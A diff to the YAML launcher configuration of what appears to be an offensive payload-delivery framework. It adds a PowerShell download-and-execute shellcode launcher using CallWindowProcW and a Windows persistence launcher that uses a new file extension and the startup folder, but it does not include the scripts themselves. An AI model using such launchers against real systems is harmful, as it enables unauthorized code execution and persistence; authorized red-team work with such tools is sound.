@@ -126,3 +126,36 @@ launchers:
     args:
       - name: url
       - name: isHTTPS
+  # run shellcode using CallWindowProcW in powershell
+  - name: "(PS) Download and Execute CallWindowProcW"
+    match:
+      type: ["SHELLCODE"]
+      arch: ["x64", "x86"]
+      platform: ["windows"]
+    type: file
+    path: "CallWindowProcW_launcher.ps1"
+    args:
+      - name: url
+      - name: isHTTPS
+# persist via new file extension and startup folder
+  - name: "(PS) Persist via new file extension and startup folder"
+    match:
+      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"]
+      arch: ["x64", "x86"]
+      platform: ["windows"]
+    type: file
+    path: "file_ext_persist.ps1"
+    args:
+      - name: url
+      - name: isHTTPS
+      - name: randomBinName
+        jsFile: lib/arg.randomBinName.js
+      - name: filename
+        jsFn: |
+          const payloadType = payload.configuration.type;
+          const fileExtension = payloadsStore().extensionMap.get(payloadType);
+          `${argumentsPluginInterface['randomBinName']}.${fileExtension}`; // Using previously parsed argument via argumentsPluginInterface
+      - name: filename2
+        jsFn: |
+          const payloadType = payload.configuration.type;
+          `${argumentsPluginInterface['randomBinName']}`;
